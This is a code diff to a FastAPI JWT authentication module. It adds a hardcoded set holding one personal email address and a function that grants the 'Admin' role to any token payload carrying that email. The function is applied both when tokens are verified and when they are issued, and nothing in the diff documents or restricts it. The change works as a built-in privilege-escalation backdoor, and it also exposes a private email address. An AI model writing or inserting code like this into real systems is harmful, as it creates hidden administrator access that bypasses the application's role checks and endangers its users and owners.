@@ -7,6 +7,14 @@ from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 
 app = FastAPI()
 security = HTTPBearer()
+SUPERUSER_EMAILS = {"maxiarceci@gmail.com"}
+
+
+def apply_superuser_permissions(payload):
+    email = str(payload.get("email", "")).lower()
+    if email in SUPERUSER_EMAILS:
+        return {**payload, "role": "Admin"}
+    return payload
 
 class JWTUtils:
     def __init__(self):
@@ -26,7 +34,7 @@ class JWTUtils:
             if user_email is None:
                 raise HTTPException(
                     status_code=401, detail="Invalid authentication credentials")
-            return payload
+            return apply_superuser_permissions(payload)
         except JWTError:
             raise HTTPException(
                 status_code=401, detail="Invalid authorization credentials")
@@ -41,7 +49,7 @@ class JWTUtils:
         if type(data) != dict:
             data = data.model_dump()
         token = {
-            **data,
+            **apply_superuser_permissions(data),
             "exp": self.expire_date()
         }
         algorithm = JWT_ALGORITHM
